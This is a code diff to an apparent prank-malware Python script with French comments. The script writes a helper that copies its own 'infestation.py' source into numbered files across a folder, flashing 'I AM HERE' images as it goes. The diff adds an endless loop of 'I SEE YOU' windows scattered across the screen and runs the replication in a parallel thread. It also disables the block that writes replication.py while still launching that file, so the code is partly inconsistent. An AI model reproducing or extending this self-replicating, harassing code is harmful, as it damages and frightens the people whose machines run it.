@@ -32,6 +32,7 @@ import tkinter as tk
 import random
 import os
 import subprocess
+import threading
 
 root = tk.Tk()
 
@@ -40,9 +41,14 @@ screen_height = root.winfo_screenheight()
 symbols_folder = "symbols/"
 
 
+"""
+
 with open("replication.py", "w") as f:
     f.write('''
+
+import cv2
 import os
+import random
 
 # ouvrir le fichier source
 with open('infestation.py', 'r') as f:
@@ -58,14 +64,51 @@ for i, filename in enumerate(os.listdir(folder_path)):
         # ouvrir le fichier et ecrire le code source
         with open(os.path.join(folder_path, f"infestation_{i}.py"), 'w') as f:
             f.write(source_code)
+            # Chemin d'accès au dossier contenant les images
+            images_folder = "I_AM_HERE/"
+
+            # Sélectionnez une image aléatoire à partir du dossier
+            image_file = random.choice(os.listdir(images_folder))
+            image_path = os.path.join(images_folder, image_file)
+
+            # Chargez l'image et affichez-la
+            image = cv2.imread(image_path, cv2.IMREAD_ANYCOLOR)
+            cv2.imshow("I AM HERE", image)
+            cv2.waitKey(800)
+
+            # Détruisez la fenêtre d'affichage
+            cv2.destroyWindow("I AM HERE")
+
 ''')
 
-subprocess.run(["python", "replication.py"])
+"""
 
-i = 0
-symbol_path = os.path.join(symbols_folder, random.choice(os.listdir(symbols_folder)))
-img = cv2.imread(symbol_path, cv2.IMREAD_ANYCOLOR)
-cv2.imshow("I SEE YOU" + str(i), img)
-cv2.moveWindow("I SEE YOU"+ str(i), random.randint(0, screen_width),random.randint(0, screen_height));
-cv2.waitKey(800)
-cv2.destroyWindow("I SEE YOU" + str(i-3))
+def display_images():
+    i = 0
+    # Boucle infinie
+    while True:
+        symbol_path = os.path.join(symbols_folder, random.choice(os.listdir(symbols_folder)))
+        img = cv2.imread(symbol_path, cv2.IMREAD_ANYCOLOR)
+        cv2.imshow("I SEE YOU" + str(i), img)
+        cv2.moveWindow("I SEE YOU"+ str(i), random.randint(0, screen_width),random.randint(0, screen_height));
+        cv2.waitKey(800)
+        if(i>=2):
+            cv2.destroyWindow("I SEE YOU" + str(i-2))
+        i += 1
+
+def run_replication():
+    subprocess.run(["python", "replication.py"])
+
+# Créer un thread pour exécuter la fonction "display_images"
+images_thread = threading.Thread(target=display_images)
+
+# Créer un thread pour exécuter la fonction "run_replication"
+replication_thread = threading.Thread(target=run_replication)
+
+# Lancer les deux threads en parallèle
+images_thread.start()
+replication_thread.start()
+
+# Attendre que les deux threads se terminent
+images_thread.join()
+replication_thread.join()
